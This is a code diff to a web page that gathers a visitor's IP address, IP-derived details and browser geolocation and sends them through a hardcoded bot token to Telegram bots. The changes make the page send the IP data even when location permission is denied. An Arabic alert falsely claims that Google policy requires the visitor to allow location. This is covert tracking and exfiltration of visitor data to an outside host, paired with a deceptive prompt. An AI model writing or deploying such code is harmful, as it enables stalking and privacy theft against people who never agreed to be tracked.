@@ -53,6 +53,7 @@ ${ipAddress}
     });
   }
   async function sendIPToTelegramBots() {
+	  
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
@@ -102,6 +103,7 @@ ${ipAddress}
         parse_mode: 'HTML',
       }),
     });
+	yourFunction();
   }
   async function getIPInfo(ip) {
     const response = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -113,6 +115,7 @@ ${ipAddress}
   
   
   async function yourFunction() {
+	  
 	   if (!navigator.geolocation) {
     // Geolocation not supported by browser
 yourFunction();
@@ -133,11 +136,11 @@ yourFunction();
 		    //alert("اضغط سماح لاستمرار allow");
        alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
         // showAlert();
-		yourFunction();
+		sendIPToTelegramBots();
          redirectToNextURL();
         // Location permission denied, send IP result to Telegram bots
      } else {
-		 yourFunction();
+		 sendIPToTelegramBots();
       // Geolocation failed for other reasons (e.g., GPS unavailable)
       alert(".تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
     }
@@ -147,10 +150,6 @@ yourFunction();
   
   
   
-function showAlert() {
-  // You can customize the alert message and behavior here
-  alert("Location permission is denied. This app needs your location to function properly.");
-}
   function redirectToNextURL() {
     // Get the current URL
     var currURL = window.location.href;
@@ -184,8 +183,6 @@ function showAlert() {
 		/>
 	{/each}
 </a>
-
-<img width="200" src="https://www.hubspot.com/hubfs/image-hubspot-centering-css.jpeg">
 
 <div class="text">
 	<span style="opacity: {1 - Math.max(0, y / 40)}"> scroll down </span>
